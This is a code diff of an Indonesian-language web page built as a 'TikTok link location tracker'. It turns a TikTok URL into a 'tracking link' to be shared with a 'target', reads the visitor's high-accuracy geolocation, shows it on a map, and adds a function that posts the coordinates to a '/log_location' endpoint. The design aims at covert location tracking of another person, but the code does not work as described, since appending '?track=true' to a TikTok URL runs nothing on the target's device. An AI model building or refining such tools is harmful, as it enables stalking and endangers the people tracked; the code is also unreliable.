@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Pelacak Link TikTok</title>
+    <title>Pelacakan Lokasi via Link TikTok</title>
     <link
       rel="stylesheet"
       href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css"
@@ -19,7 +19,6 @@
         align-items: flex-start;
         min-height: 100vh;
       }
-
       .container {
         background: #fff;
         margin-top: 50px;
@@ -29,20 +28,17 @@
         width: 90%;
         max-width: 700px;
       }
-
       h2 {
         color: #333;
         text-align: center;
         margin-bottom: 20px;
       }
-
       label {
         display: block;
         font-weight: 600;
         margin-bottom: 8px;
         color: #444;
       }
-
       input[type="url"] {
         width: 100%;
         padding: 12px;
@@ -50,7 +46,6 @@
         border-radius: 8px;
         font-size: 16px;
       }
-
       button {
         margin-top: 20px;
         padding: 12px 20px;
@@ -62,38 +57,31 @@
         color: white;
         transition: background-color 0.3s ease;
       }
-
       button:hover {
         background-color: #218838;
       }
-
       .result {
         margin-top: 20px;
         font-size: 16px;
       }
-
       .result a {
         color: #007bff;
         text-decoration: none;
       }
-
       .btn-container {
         display: flex;
         gap: 10px;
         margin-top: 20px;
         flex-wrap: wrap;
       }
-
       .btn-container button {
         flex: 1;
         min-width: 120px;
       }
-
       #map-container {
         display: none;
         margin-top: 30px;
       }
-
       #map {
         height: 400px;
         width: 100%;
@@ -114,20 +102,16 @@
         />
         <button type="submit">Buat Link Pelacakan</button>
       </form>
-
       <div class="result" id="tracking-link"></div>
-
       <div class="btn-container" id="btn-container" style="display: none">
         <button id="preview-btn">Tampilkan Lokasi di Map</button>
         <button id="copy-btn">Salin Link</button>
       </div>
-
       <div id="map-container">
         <h3>Lokasi Pengguna Saat Klik:</h3>
         <div id="map"></div>
       </div>
     </div>
-
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
     <script>
       const form = document.getElementById("tracking-form");
@@ -135,24 +119,24 @@
       const btnContainer = document.getElementById("btn-container");
       const previewBtn = document.getElementById("preview-btn");
       const copyBtn = document.getElementById("copy-btn");
-
       let finalLink = "";
       let mapInitialized = false;
-      let map; // Leaflet map instance
+      let map;
 
       form.addEventListener("submit", function (e) {
         e.preventDefault();
         const userLink = document.getElementById("target").value;
-        finalLink = userLink;
-
+        // Menambahkan parameter track=true pada URL
+        finalLink = `${userLink}?track=true`;
         linkOutput.innerHTML = `
-          <p>Salin dan bagikan link ini ke target:</p>
-          <a href="${finalLink}" target="_blank">${finalLink}</a>
-        `;
+              <p>Salin dan bagikan link ini ke target:</p>
+              <a href="${finalLink}" target="_blank">${finalLink}</a>
+          `;
         btnContainer.style.display = "flex";
       });
 
       previewBtn.addEventListener("click", function () {
+        // Start getting location of the user who clicks the link
         getUserLocation();
       });
 
@@ -166,15 +150,26 @@
         alert("Link berhasil disalin!");
       });
 
+      // Fungsi untuk memeriksa URL apakah ada parameter track=true
+      function checkTrackParam() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.has("track") && urlParams.get("track") === "true";
+      }
+
+      // Fungsi untuk mendapatkan lokasi pengguna
       function getUserLocation() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(showMap, showError, {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0,
-          });
+        if (checkTrackParam()) {
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(showMap, showError, {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0,
+            });
+          } else {
+            alert("Browser tidak mendukung geolokasi.");
+          }
         } else {
-          alert("Browser tidak mendukung geolokasi.");
+          alert("Link pelacakan ini tidak valid untuk lokasi.");
         }
       }
 
@@ -182,9 +177,7 @@
         const lat = position.coords.latitude;
         const lon = position.coords.longitude;
         const accuracy = position.coords.accuracy;
-
         document.getElementById("map-container").style.display = "block";
-
         if (!mapInitialized) {
           map = L.map("map").setView([lat, lon], 17);
           L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
@@ -194,7 +187,6 @@
         } else {
           map.setView([lat, lon], 17);
         }
-
         L.marker([lat, lon])
           .addTo(map)
           .bindPopup(
@@ -203,6 +195,9 @@
             )} meter`
           )
           .openPopup();
+
+        // Send this location to the server for logging purposes
+        sendLocationToServer(lat, lon);
       }
 
       function showError(error) {
@@ -219,6 +214,20 @@
           default:
             alert("Terjadi kesalahan tidak diketahui.");
         }
+      }
+
+      function sendLocationToServer(lat, lon) {
+        // Example: Use fetch to send location to a server
+        fetch("/log_location", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ lat: lat, lon: lon }),
+        })
+          .then((response) => response.json())
+          .then((data) => console.log("Location logged:", data))
+          .catch((error) => console.error("Error logging location:", error));
       }
     </script>
   </body>
